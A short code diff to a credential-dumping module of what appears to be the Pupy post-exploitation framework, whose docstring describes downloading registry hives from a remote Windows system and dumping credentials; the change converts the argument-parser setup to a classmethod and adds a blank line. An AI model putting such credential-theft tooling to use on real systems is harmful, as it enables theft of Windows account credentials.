@@ -39,8 +39,9 @@ __class_name__="CredDump"
 class CredDump(PupyModule):
     """ download the hives from a remote windows system and dump creds """
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='hive', description=cls.__doc__)
 
     def run(self, args):
         config = self.client.pupsrv.config or PupyConfig()
@@ -178,6 +179,7 @@ class CredDump(PupyModule):
         for cmd in cmds:
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
+
         self.success("hives saved!")
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
 
